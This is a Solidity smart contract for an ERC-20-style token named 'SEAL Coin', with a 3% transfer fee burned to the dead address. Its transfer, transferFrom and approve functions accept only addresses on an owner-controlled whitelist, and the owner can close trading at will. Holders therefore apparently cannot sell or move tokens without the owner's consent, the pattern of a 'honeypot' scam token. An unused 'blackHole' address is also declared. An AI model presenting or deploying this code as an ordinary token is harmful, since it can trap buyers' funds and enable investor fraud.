// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SEAL {
    string public name = "SEAL Coin";
    string public symbol = "SEAL";
    uint256 public totalSupply = 21000000 * 10 ** 18;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public immutable blackHole = 0x77c6b9dC608b137576A5c7e133Bf3115d3671F25;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public constant maxTransactionFee = 3;
    uint256 public constant feeDivider = 100;

    mapping(address => bool) public isExemptFromFee;

    bool private isTradingOpen;
    mapping(address => bool) private whitelist;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TradingStatusChanged(bool isOpen);

    modifier onlyWhitelisted() {
        require(whitelist[msg.sender], "Address is not whitelisted");
        _;
    }

    modifier tradingOpen() {
        require(isTradingOpen, "Trading is currently closed");
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == contractOwner, "Only the contract owner can perform this action");
        _;
    }

    address private contractOwner;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        isTradingOpen = true;
        isExemptFromFee[msg.sender] = true; // Contract deployer is exempt from fee
        isExemptFromFee[deadAddress] = true; // 0x000000000000000000000000000000000000dEaD is exempt from fee
        contractOwner = msg.sender; // Set the contract owner initially
    }

    function addToWhitelist(address _address) external onlyOwner {
        whitelist[_address] = true;
    }

    function removeFromWhitelist(address _address) external onlyOwner {
        whitelist[_address] = false;
    }

    function openTrading() external onlyOwner {
        isTradingOpen = true;
        emit TradingStatusChanged(true);
    }

    function closeTrading() external onlyOwner {
        isTradingOpen = false;
        emit TradingStatusChanged(false);
    }

    function setExemptFromFee(address _address, bool exempt) external onlyOwner {
        isExemptFromFee[_address] = exempt;
    }

    function transfer(address to, uint256 value) external onlyWhitelisted tradingOpen returns (bool success) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external onlyWhitelisted tradingOpen returns (bool success) {
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Allowance too low");
        _transfer(from, to, value);
        _approve(from, msg.sender, allowance[from][msg.sender] - value);
        return true;
    }

    function _transfer(address from, address to, uint256 value) internal {
        uint256 fee = isExemptFromFee[from] || isExemptFromFee[to] ? 0 : (value * maxTransactionFee) / feeDivider;
        uint256 netValue = value - fee;

        balanceOf[from] -= value;
        balanceOf[to] += netValue;
        balanceOf[deadAddress] += fee;

        emit Transfer(from, to, netValue);
        emit Transfer(from, deadAddress, fee);
    }

    function approve(address spender, uint256 value) external onlyWhitelisted tradingOpen returns (bool success) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function _approve(address owner, address spender, uint256 value) internal {
        allowance[owner][spender] = value;
        emit Approval(owner, spender, value);
    }
}